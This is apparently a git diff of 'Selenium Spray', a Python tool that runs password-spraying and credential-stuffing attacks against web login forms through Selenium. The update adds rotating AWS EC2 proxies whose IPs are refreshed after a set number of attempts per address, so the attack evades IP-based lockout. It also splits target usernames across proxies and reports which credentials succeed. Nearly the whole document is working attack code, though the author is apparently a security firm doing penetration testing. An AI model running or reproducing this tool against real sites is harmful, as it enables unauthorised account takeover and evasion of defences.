@@ -1,4 +1,3 @@
-import argparse
 import sys
 from time import sleep
 from selenium import webdriver
@@ -11,13 +10,15 @@ from selenium.common.exceptions import TimeoutException
 from concurrent.futures import ProcessPoolExecutor
 import multiprocessing
 import pause
+from multiprocessing import Process
+from utils import SprayConfig, aws
+from utils import utils
 
 # --------------------------------- #
 # GLOBAL VARIABLES                  #
 # --------------------------------- #
 
-valid_credentials = []
-__version__ = "0.3"
+__version__ = "0.4"
 
 
 # --------------------------------- #
@@ -39,21 +40,6 @@ class Colors:
 # --------------------------------- #
 # FUNCTIONS                         #
 # --------------------------------- #
-
-def process_queue(queue=None, usernames=None):
-    if queue.empty():
-        return usernames
-    while not queue.empty():
-        user = queue.get()
-        for i in range(len(usernames) - 1, -1, -1):  # Loop in reverse to avoid index issues
-            if usernames[i]["USERNAME"] == user["USERNAME"]:
-                del usernames[i]
-        if user["VALID"]:
-            global valid_credentials
-            valid_credentials.append({"USERNAME": user["USERNAME"], "PASSWORD": user["PASSWORD"]})
-
-    return usernames
-
 
 def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key,
                         username_field_value, password_field_key, password_field_value, checkbox_key, checkbox_value):
@@ -82,12 +68,10 @@ def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_u
         # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
         # individual processes.
         manager = multiprocessing.Manager()
-        queue = manager.Queue()
         with ProcessPoolExecutor(max_workers=threads) as executor:
             for credential in credentials:
                 if credential['ATTEMPT'] == stuffing_attempt:
                     processes = executor.submit(attempt_login,
-                                                queue=queue,
                                                 username=credential['USERNAME'],
                                                 password=credential['PASSWORD'],
                                                 url=url,
@@ -102,11 +86,8 @@ def credential_stuffing(usernames, url, fail, success, threads, delay, invalid_u
                                                 invalid_username=invalid_username)
             processes.result()
 
-        # The credential stuffing attempts do not remove valid credentials from future sprays
-        credentials = process_queue(queue=queue, usernames=credentials)  # Retrieve results from the queue
-
         # Check to see if the process is at the end. If not, wait the specified time.
-        if stuffing_attempt < (num_stuffing_attempts):
+        if stuffing_attempt < num_stuffing_attempts:
             print(f"Stuffing attempt {stuffing_attempt} of {num_stuffing_attempts} complete. Waiting until "
                   f"{next_start_time.strftime('%H:%M')} to start next spray.")
             pause.until(next_start_time)
@@ -127,7 +108,7 @@ def print_beginning(usernames=None, passwords=None, domain="", domain_after=Fals
     else:
         spray_duration = "{:02d} {:02d}:{:02d}".format(days, hours, minutes)
 
-    print(f"{Colors.HEADER}{Colors.BOLD}Selneium Spray{Colors.END}")
+    print(f"{Colors.HEADER}{Colors.BOLD}Selenium Spray{Colors.END}")
     print(f"Author:  Luke Lauterbach (Sentinel Technologies)")
     print(f"Version: {__version__}\n")
 
@@ -160,58 +141,6 @@ def print_ending():
         print(f"------------------")
         for credential in valid_credentials:
             print(f"{credential['USERNAME']} - {credential['PASSWORD']}")
-
-
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="Performs a password spraying attack utilizing Selenium.")
-    required = parser.add_argument_group("Required")
-    condition = parser.add_argument_group("Condition for Successful Login (One Required)")
-    optional = parser.add_argument_group("Optional")
-
-    required.add_argument('URL',
-                          help="(REQUIRED) URL of the website to spray.")
-    optional.add_argument("-d", "--domain",
-                          help="(REQUIRED) Prefix all usernames with a domain (e.g. DOMAIN\\USERNAME)")
-    optional.add_argument("-da", "--domain-after", action="store_true",
-                          help="(OPTIONAL) Append domain to the end of the username (e.g. username@domain)")
-    required.add_argument("-p", "--password",
-                          help="(OPTIONAL) Password or file with list of usernames to spray.")
-    condition.add_argument('-f', '--fail',
-                           help="(OPTIONAL) Text which will be on the page if authentication fails. -s can be used as "
-                                "an alternative.")
-    condition.add_argument('-s', '--success',
-                           help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
-                                "used as an alternative")
-    required.add_argument("-u", "--username", required=True,
-                          help="(REQUIRED) Username or file with list of usernames to spray. Alternatively, can be a"
-                               "list of colon-seperated credentials to spray (e.g. USER:PASS)")
-    optional.add_argument("-i", "--invalid-username", type=str,
-                          help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
-                               "strings can be provided comma seperated with no spaces.")
-    required.add_argument('-uf', '--username-field', required=True, type=str,
-                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                               "a username into. Can be found by inspecting the username field in your browser. For"
-                               "example, if '<input type='email'>', enter 'type='email''")
-    required.add_argument('-pf', '--password-field', required=True, type=str,
-                          help="(REQUIRED) Input field attribute, used to identify which field should be used to put"
-                               "a username into. Can be found by inspecting the username field in your browser. For"
-                               "example, if '<input type='email'>', enter 'type='email''")
-    optional.add_argument('-cb', '--checkbox', type=str,
-                          help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
-                               "allowing the script to automatically check it. For example, if "
-                               "'<input type='checkbox'>', enter 'type='checkbox''")
-
-    optional.add_argument('-t', '--threads', type=int, default=5,
-                          help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
-                               "Default is 5.")
-    optional.add_argument('-dl', '--delay', type=int, default=30,
-                          help="(OPTIONAL) Length of time between passwords. The delay is between the first spray "
-                               "attempt with a password and the first attempt with the next password. Default is 30.")
-
-    args = parser.parse_args()  # Parse the command-line arguments
-    return (args.username, args.password, args.domain, args.domain_after, args.URL, args.username_field,
-            args.password_field, args.checkbox, args.fail, args.success, args.threads, args.delay,
-            args.invalid_username)
 
 
 def import_txt_file(filename):
@@ -315,28 +244,28 @@ def list_in_string(string_to_check="", list_to_compare=None):
     return False
 
 
-def attempt_login(username=None, password="", url="", username_field_key="", username_field_value="",
-                  password_field_key="", password_field_value="", checkbox_key="", checkbox_value="", fail=None,
-                  success=None, queue=None, invalid_username=None):
+def attempt_login(spray_config, username, proxy):
     selenium_options = webdriver.ChromeOptions()
     selenium_options.add_argument('--ignore-certificate-errors')
-    selenium_options.add_argument("--headless")
+    #selenium_options.add_argument("--headless")
+    if proxy:
+        selenium_options.add_argument(f'--proxy-server=http://{proxy}:8888')
     driver = webdriver.Chrome(options=selenium_options)
     driver.delete_all_cookies()
-    driver.get(url)
+    driver.get(spray_config.url)
 
     # Wait until the username box loads
     try:
         WebDriverWait(driver, 5).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")))
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")))
     except:
-        print(f"ERROR - Could not find the username field with key {username_field_key} and value "
-              f"{username_field_value}")
+        print(f"ERROR - Could not find the username field with key {spray_config.username_field_key} and value "
+              f"{spray_config.username_field_value}")
         driver.close()
         return
 
     # Find the username box
-    input_box = driver.find_element(By.XPATH, f"//input[@{username_field_key}='{username_field_value}']")
+    input_box = driver.find_element(By.XPATH, f"//input[@{spray_config.username_field_key}='{spray_config.username_field_value}']")
     input_box.clear()  # Clear any existing text in the input box
     input_box.send_keys(username)
 
@@ -344,7 +273,7 @@ def attempt_login(username=None, password="", url="", username_field_key="", use
     # field to load.
     try:
         WebDriverWait(driver, 1).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
     except TimeoutException:
         input_box.send_keys(Keys.RETURN)
         sleep(1)  # Wait for the page to load
@@ -353,123 +282,155 @@ def attempt_login(username=None, password="", url="", username_field_key="", use
             work_box.click()
             sleep(1)
 
-    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=invalid_username):
+    if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {username}")
-        queue.put({"USERNAME": username, "PASSWORD": password, "VALID": False})
         driver.close()
         return
 
     try:
         WebDriverWait(driver, 3).until(
-            ec.element_to_be_clickable((By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")))
+            ec.element_to_be_clickable((By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")))
     except:
-        print(f"ERROR - Could not find the password field with key '{password_field_key}' and value "
-              f"'{password_field_value}'")
+        print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
+              f"'{spray_config.password_field_value}'")
         driver.close()
         return
 
-    password_box = driver.find_element(By.XPATH, f"//input[@{password_field_key}='{password_field_value}']")
+    password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
     password_box.clear()
-    password_box.send_keys(password)
+    password_box.send_keys(spray_config.password)
     # If there's a checkbox, click it.
-    if checkbox_key and checkbox_value:
+    if spray_config.checkbox_key and spray_config.checkbox_value:
         try:
-            checkbox = driver.find_element(By.XPATH, f"//input[@{checkbox_key}='{checkbox_value}']")
+            checkbox = driver.find_element(By.XPATH, f"//input[@{spray_config.checkbox_key}='{spray_config.checkbox_value}']")
             checkbox.click()
         except:
-            print(f"ERROR - Could not find the password field with key {password_field_key} and value "
-                  f"{password_field_value}")
+            print(f"ERROR - Could not find the password field with key {spray_config.password_field_key} and value "
+                  f"{spray_config.password_field_value}")
 
     password_box.send_keys(Keys.RETURN)
 
     # Check to see if the login was successful
     sleep(2)
     result = False
-    for conditional_statement in (fail + success):
+    for conditional_statement in (spray_config.fail + spray_config.success):
         if conditional_statement in driver.page_source:
             result = True
 
-    if result and success:
+    if result and spray_config.success:
         result = "SUCCESS"
-    elif not result and fail:
+    elif not result and spray_config.fail:
         result = "SUCCESS"
-    elif result and fail:
+    elif result and spray_config.fail:
         result = "INVALID"
-    elif not result and success:
+    elif not result and spray_config.success:
         result = "INVALID"
 
     if result == "SUCCESS":
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.GREEN}SUCCESS{Colors.END}: {username} - "
-              f"{password}")
-        queue.put({"USERNAME": str(username), "PASSWORD": str(password), "VALID": True})
+              f"{spray_config.password}")
     else:
-        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {password}")
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - INVALID: {username} - {spray_config.password}")
 
     driver.quit()
 
-def main(usernames="", passwords="", domain="", domain_after=False, url="", username_field="", password_field="",
-         checkbox="", fail="", success="", threads=5, delay=30, invalid_username=""):
-    # Prepare variables
-    fail, success = prepare_success_fail(fail=fail, success=success)
-    usernames = process_file(usernames)
-    if passwords:
-        passwords = process_file(passwords)
-    else:
-        passwords = []
-    usernames = prepare_usernames(usernames, domain, domain_after)
-    url = prepare_url(url)
-    invalid_username = prepare_invalid_username(invalid_username=invalid_username)
-    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
-     checkbox_value) = prepare_fields(username_field, password_field, checkbox=checkbox)
-    print_beginning(usernames=usernames, passwords=passwords, domain=domain, domain_after=domain_after, url=url,
-                    fail=fail, success=success, threads=threads, delay=delay, username_field=username_field,
-                    password_field=password_field, invalid_username=invalid_username)
+def main(args):
+    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
+    if args.proxy_clean:
+        utils.list_proxies(args, ec2)
+    elif args.proxy_list:
+        utils.list_proxies(args, ec2)
 
-    if not passwords and ":" in usernames[1]:
-        credential_stuffing(usernames, url, fail, success, threads, delay, invalid_username, username_field_key,
+    # Prepare variables
+    args.fail, args.success = prepare_success_fail(fail=args.fail, success=args.success)
+    args.usernames = process_file(args.usernames)
+    if args.passwords:
+        args.passwords = process_file(args.passwords)
+    else:
+        args.passwords = []
+    args.usernames = prepare_usernames(args.usernames, args.domain, args.domain_after)
+    args.url = prepare_url(args.url)
+    invalid_username = prepare_invalid_username(invalid_username=args.invalid_username)
+    (username_field_key, username_field_value, password_field_key, password_field_value, checkbox_key,
+     checkbox_value) = prepare_fields(args.username_field, args.password_field, checkbox=args.checkbox)
+    print_beginning(usernames=args.usernames, passwords=args.passwords, domain=args.domain, domain_after=args.domain_after, url=args.url,
+                    fail=args.fail, success=args.success, threads=args.threads, delay=args.delay, username_field=args.username_field,
+                    password_field=args.password_field, invalid_username=invalid_username)
+
+    if not args.passwords and ":" in args.usernames[1]:
+        credential_stuffing(args.usernames, args.url, args.fail, args.success, args.threads, args.delay, invalid_username, username_field_key,
                             username_field_value, password_field_key, password_field_value, checkbox_key,
                             checkbox_value)
+    ec2 = aws.get_ec2_session(args.aws_region, args.aws_access_key, args.aws_secret_key, args.aws_session_token)
+    proxies = utils.prepare_proxies(ec2, args)
+
+    spray_config = SprayConfig.SprayConfig(
+        url=args.url,
+        username_field_key=username_field_key,
+        username_field_value=username_field_value,
+        password_field_key=password_field_key,
+        password_field_value=password_field_value,
+        checkbox_key=checkbox_key,
+        checkbox_value=checkbox_value,
+        fail=args.fail,
+        success=args.success,
+        invalid_username=invalid_username,
+        num_sprays_per_ip=args.num_sprays_per_ip,
+        aws_region=args.aws_region,
+        aws_access_key=args.aws_access_key,
+        aws_secret_key=args.aws_secret_key,
+        aws_session_token=args.aws_session_token
+    )
+
     # Loop through passwords
     password_id = 0
-    while password_id < len(passwords):
-        next_start_time = datetime.now() + timedelta(minutes=delay)  # Check when the next spray should run
+    while password_id < len(args.passwords):
+        spray_config.password = args.passwords[password_id]
+        next_start_time = datetime.now() + timedelta(minutes=args.delay)  # Check when the next spray should run
 
-        print(f"Beginning spray with password '{passwords[password_id]}'")
+        print(f"Beginning spray with password '{args.passwords[password_id]}'")
 
-        # Spin up processes for each login attempt. Threads could have also been utilized, but Selenium is cleaner with
-        # individual processes.
-        manager = multiprocessing.Manager()
-        queue = manager.Queue()
-        with ProcessPoolExecutor(max_workers=threads) as executor:
-            for username in usernames:
-                processes = executor.submit(attempt_login,
-                                            queue=queue,
-                                            username=username,
-                                            password=str(passwords[password_id]),
-                                            url=url,
-                                            username_field_key=username_field_key,
-                                            username_field_value=username_field_value,
-                                            password_field_key=password_field_key,
-                                            password_field_value=password_field_value,
-                                            checkbox_key=checkbox_key,
-                                            checkbox_value=checkbox_value,
-                                            fail=fail,
-                                            success=success,
-                                            invalid_username=invalid_username)
-            processes.result()
+        # Split users among proxies
+        chunk_size = (len(args.usernames) + len(proxies) - 1) // len(proxies)
+        user_chunks = [args.usernames[i:i + chunk_size] for i in range(0, len(args.usernames), chunk_size)]
 
-        usernames = process_queue(queue=queue, usernames=usernames)  # Retrieve results from the queue
+        processes = []
+        for proxy, user_chunk in zip(proxies, user_chunks):
+            p = Process(target=perform_spray, args=(spray_config, user_chunk, proxy))
+            p.start()
+            processes.append(p)
+
+        for p in processes:
+            p.join()
 
         # Check to see if the process is at the end. If not, wait the specified time.
         password_id += 1
-        if password_id < len(passwords):
-            print(f"Spray of password '{passwords[(password_id - 1)]}' complete. Waiting until "
+        if password_id < len(args.passwords):
+            print(f"Spray of password '{args.passwords[(password_id - 1)]}' complete. Waiting until "
                   f"{next_start_time.strftime('%H:%M')} to start next spray.")
             pause.until(next_start_time)
         else:
-            print(f"Spray of password '{passwords[password_id - 1]}' complete. All passwords complete.")
+            print(f"Spray of password '{args.passwords[password_id - 1]}' complete. All passwords complete.")
 
+    utils.destroy_proxies(args, ec2)
     print_ending()
+
+
+def perform_spray(spray_config, usernames, proxy):
+    ec2 = aws.get_ec2_session(spray_config.aws_region, spray_config.aws_access_key, spray_config.aws_secret_key, spray_config.aws_session_token)
+    spray_num_with_current_ip = 0
+    if proxy['type'] == 'AWS':
+        proxy['ip'] = aws.start_ec2_instance(ec2, proxy['id'])
+
+    for user in usernames:
+        if spray_num_with_current_ip >= spray_config.num_sprays_per_ip and proxy['type'] == 'AWS':
+            proxy['ip'] = aws.refresh_instance_ip(ec2, proxy['id'])
+            spray_num_with_current_ip = 0
+        attempt_login(spray_config, user, proxy['ip'])
+        spray_num_with_current_ip += 1
+
+    if proxy['type'] == 'AWS':
+        aws.stop_ec2_instance(ec2, proxy['id'])
 
 
 # --------------------------------- #
@@ -477,13 +438,9 @@ def main(usernames="", passwords="", domain="", domain_after=False, url="", user
 # --------------------------------- #
 
 if __name__ == "__main__":
-    (main_usernames, main_passwords, main_domain, main_domain_after, main_url, main_username_field, main_password_field,
-     main_checkbox, main_fail, main_success, main_threads, main_delay, main_invalid_username) = parse_arguments()
     try:
-        main(usernames=main_usernames, passwords=main_passwords, domain=main_domain, domain_after=main_domain_after,
-             url=main_url, username_field=main_username_field, password_field=main_password_field,
-             checkbox=main_checkbox, fail=main_fail, success=main_success, threads=main_threads, delay=main_delay,
-             invalid_username=main_invalid_username)
+        main_args = utils.parse_arguments()
+        main(main_args)
     except KeyboardInterrupt:
         print("\nCtrl+C Detected")
         print_ending()
